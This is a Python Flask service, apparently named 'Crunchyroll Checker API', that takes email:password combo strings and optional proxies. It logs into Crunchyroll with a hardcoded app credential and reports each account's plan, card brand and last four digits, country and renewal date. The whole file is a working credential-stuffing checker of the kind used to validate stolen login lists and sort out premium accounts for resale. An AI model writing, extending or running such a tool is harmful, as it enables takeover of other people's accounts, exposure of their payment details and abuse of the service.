from flask import Flask, request, jsonify
import requests
from urllib.parse import quote
from datetime import datetime
import pytz

app = Flask(__name__)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"

def translate_sku_to_plan(sku, amount, cycle_duration):
    if not sku or sku == "N/A":
        if amount and amount != "N/A" and float(amount) > 0:
            if cycle_duration == "P1M":
                if float(amount) <= 7.99:
                    return "Fan"
                elif float(amount) <= 9.99:
                    return "Mega Fan"
                elif float(amount) <= 15.99:
                    return "Ultimate Fan"
            elif cycle_duration == "P1Y":
                return "Annual " + ("Fan" if float(amount) <= 79.99 else "Mega Fan" if float(amount) <= 99.99 else "Ultimate Fan")
        return "Free"
    sku = sku.lower()
    plan_mapping = {
        "fan": "Fan",
        "mega": "Mega Fan",
        "ultimate": "Ultimate Fan",
        "premium": "Premium",
        "free": "Free"
    }
    for key, value in plan_mapping.items():
        if key in sku:
            return value
    return sku

def format_proxy(proxy_string):
    if not proxy_string:
        return None
    if "@" in proxy_string:
        if not proxy_string.startswith("http"):
            proxy_string = "http://" + proxy_string
        return {"http": proxy_string, "https": proxy_string}
    parts = proxy_string.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        pstr = f"http://{user}:{pwd}@{ip}:{port}"
        return {"http": pstr, "https": pstr}
    elif len(parts) == 2:
        ip, port = parts
        pstr = f"http://{ip}:{port}"
        return {"http": pstr, "https": pstr}
    return None

def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
    """
    Use this to get extra Crunchyroll details using web API, after you already have access_token.
    Returns dict with plan, payment, country, trial, status, renewal, days_left, etc.
    """
    UA = ua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"
    # Get user id for web API
    me_headers = {
        "User-Agent": UA,
        "Authorization": f"Bearer {token}",
    }
    try:
        me_res = session.get(
            "https://www.crunchyroll.com/accounts/v1/me",
            headers=me_headers,
            proxies=proxies,
            timeout=10
        )
        if me_res.status_code != 200:
            return {}
        me_json = me_res.json()
        account_id = me_json.get("account_id")
        if not account_id:
            return {}
    except Exception:
        return {}

    subs_headers = {
        "Host": "www.crunchyroll.com",
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Authorization": f"Bearer {token}",
        "Referer": "https://www.crunchyroll.com/account/membership"
    }
    try:
        subs_res = session.get(
            f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
            headers=subs_headers,
            proxies=proxies,
            timeout=20
        )
        if subs_res.status_code != 200:
            return {}
        data = subs_res.json()
    except Exception:
        return {}

    if data.get("containerType") == "free":
        return {
            "web_plan": "Free",
            "web_status": "free"
        }

    subscriptions = data.get("subscriptions", [])
    plan_text = plan_value = active_free_trial = next_renewal_date = status = "N/A"
    payment_info = country_code = "N/A"

    if subscriptions:
        plan = subscriptions[0].get("plan", {})
        tier = plan.get("tier", {})
        plan_text = tier.get("text") or plan.get("name", {}).get("text") or tier.get("value") or plan.get("name", {}).get("value") or "N/A"
        plan_value = tier.get("value") or plan.get("name", {}).get("value") or "N/A"
        active_free_trial = str(subscriptions[0].get("activeFreeTrial", False))
        next_renewal_date = subscriptions[0].get("nextRenewalDate", "N/A")
        status = subscriptions[0].get("status", "N/A")

    payment = data.get("currentPaymentMethod", {})
    if payment:
        payment_type = payment.get("paymentMethodType", "")
        payment_name = payment.get("name", "")
        payment_last4 = payment.get("lastFour", "")
        country_code = payment.get("countryCode", "N/A")
        if payment_type == "credit_card" and payment_name and payment_last4:
            payment_info = f"{payment_name} ending in {payment_last4}"
        else:
            payment_info = payment_name or payment_type or "N/A"
    else:
        payment_info = "N/A"
        country_code = "N/A"

    if next_renewal_date not in ["N/A", "None"]:
        try:
            renewal_dt = datetime.strptime(next_renewal_date, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
            formatted_renewal_date = renewal_dt.strftime("%d-%m-%Y")
            ist = pytz.timezone("Asia/Kolkata")
            current_dt = datetime.now(ist)
            days_left = (renewal_dt.astimezone(ist) - current_dt).days
            if days_left < 0:
                days_left = 0
        except Exception:
            formatted_renewal_date = next_renewal_date
            days_left = "N/A"
    else:
        formatted_renewal_date = next_renewal_date
        days_left = "N/A"

    return {
        "web_plan": f"{plan_text}—{plan_value}",
        "web_payment": payment_info,
        "web_country": country_code,
        "web_trial": active_free_trial,
        "web_status": status,
        "web_renewal": formatted_renewal_date,
        "web_days_left": days_left
    }

def crunchyroll_check(email, password, proxy=None):
    session = requests.Session()
    proxies = format_proxy(proxy) if proxy else None

    plan = "Free"
    amount = "N/A"
    expiry = "N/A"
    message = "Invalid or Free Account"
    subscription_status = "Free"
    free_trial = "No"
    web_details = {}

    common_headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "x-datadog-sampling-priority": "0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Referer": "https://www.crunchyroll.com/",
        "Origin": "https://www.crunchyroll.com/",
    }
    auth_request_headers = {
        **common_headers,
        "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
        "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "beta-api.crunchyroll.com",
        "ETP-Anonymous-ID": "ccdcc444-f39c-48c3-9aa1-f72ebb93dfb1",
    }
    data = f"username={quote(email)}&password={quote(password)}&grant_type=password&scope=offline_access&device_id=14427c33-1893-4bc5-aaf3-dea072be2831&device_type=Chrome%20on%20Android"

    try:
        res = session.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            headers=auth_request_headers, data=data, proxies=proxies, timeout=15
        )
        if res.status_code in [403, 429, 500, 502, 503]:
            return email, password, "Blocked/RateLimited by Crunchyroll/Proxy.", plan, amount, expiry, web_details
        if "invalid_credentials" in res.text:
            return email, password, "Invalid or Free Account.", plan, amount, expiry, web_details

        try:
            json_res = res.json()
        except Exception:
            return email, password, "Crunchyroll sent invalid JSON at login.", plan, amount, expiry, web_details

        token = json_res.get("access_token")
        if not token or json_res.get("error") or json_res.get("unsupported_grant_type"):
            return email, password, "Invalid or Free Account.", plan, amount, expiry, web_details

        auth_headers_subsequent = {
            **common_headers,
            "Authorization": f"Bearer {token}",
            "User-Agent": UA,
            "Host": "beta-api.crunchyroll.com",
            "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "etp-anonymous-id": "64a91812-bb46-40ad-89ca-ff8bb567243d",
        }

        # Get user account ids
        acc_res = session.get(
            "https://beta-api.crunchyroll.com/accounts/v1/me",
            headers=auth_headers_subsequent, proxies=proxies, timeout=10
        )
        user_id = "N/A"
        external_id = "N/A"
        if acc_res.status_code == 200:
            try:
                acc = acc_res.json()
                user_id = acc.get("account_id", "N/A")
                external_id = acc.get("external_id", "N/A")
            except Exception:
                pass

        # Benefits endpoint (to get subscription status)
        if external_id != "N/A":
            benefits_res = session.get(
                f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                headers=auth_headers_subsequent, proxies=proxies, timeout=10
            )
            if benefits_res.status_code == 200:
                benefits_json = benefits_res.json()
                benefits_total = benefits_json.get("total", 0)
                if benefits_total > 0:
                    subscription_status = "Active"
                else:
                    subscription_status = "Free"

        # Subscriptions v3 (plan, amount, etc.)
        if user_id != "N/A":
            sub_v3_res = session.get(
                f"https://beta-api.crunchyroll.com/subs/v3/subscriptions/{user_id}",
                headers=auth_headers_subsequent, proxies=proxies, timeout=10
            )
            if sub_v3_res.status_code == 200:
                sub_v3_json = sub_v3_res.json()
                subscription_products = sub_v3_json.get("subscription_products", [])
                sku = "N/A"
                if subscription_products:
                    product = subscription_products[0]
                    sku = product.get("sku") or product.get("subscription_sku") or product.get("plan_id", "N/A")
                    amount = str(product.get("amount", "N/A"))
                else:
                    sku = sub_v3_json.get("sku") or sub_v3_json.get("subscription_sku") or sub_v3_json.get("plan_id", "N/A")
                    amount = str(sub_v3_json.get("amount", "N/A"))
                cycle_duration = sub_v3_json.get("cycle_duration", "N/A")
                plan = translate_sku_to_plan(sku, amount, cycle_duration)

        # Subscriptions v1 (expiry)
        if external_id != "N/A":
            sub_v1_res = session.get(
                f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
                headers=auth_headers_subsequent, proxies=proxies, timeout=10
            )
            if sub_v1_res.status_code == 200:
                sub_v1_json = sub_v1_res.json()
                full_expiry_date_time = sub_v1_json.get("next_renewal_date")
                if full_expiry_date_time:
                    expiry = full_expiry_date_time.split("T")[0]
                else:
                    expiry = "N/A"
                if sub_v1_json.get("has_free_trial", False) and subscription_status != "Active":
                    free_trial = "Yes"

        # Result decision
        if free_trial == "Yes":
            message = "Free Trial Account"
        elif subscription_status == "Active" or (plan != "Free" and plan != "N/A"):
            message = "Premium Account"
        else:
            message = "Invalid or Free Account"

        # -------- Extract Web Details ---------
        web_details = extract_crunchyroll_account_details(session, token, proxies=proxies, ua=UA)
        # --------------------------------------

        return email, password, message, plan, amount, expiry, web_details
    except Exception as ex:
        return email, password, f"Unknown Error: {ex}", plan, amount, expiry, web_details

@app.route("/check", methods=["GET", "POST"])
def check():
    combo = request.values.get("email", "").strip()
    proxy = request.values.get("proxy", "")

    if ":" not in combo or not combo:
        return jsonify({"status": "error", "message": "Use ?email=email:pass&proxy=proxy (proxy optional)"}), 400
    email, password = combo.split(":", 1)
    if not email or not password:
        return jsonify({"status": "error", "message": "Missing email or password"}), 400

    email, password, message, plan, amount, expiry, web_details = crunchyroll_check(email, password, proxy if proxy else None)
    resp = {
        "email": email,
        "pass": password,
        "message": message,
        "plan": plan,
        "amount": amount,
        "expiry": expiry,
    }
    resp.update(web_details)
    return jsonify(resp)

@app.route("/")
def home():
    return "<h3>Crunchyroll Checker API<br>Use /check?email=email:pass&proxy=proxy</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
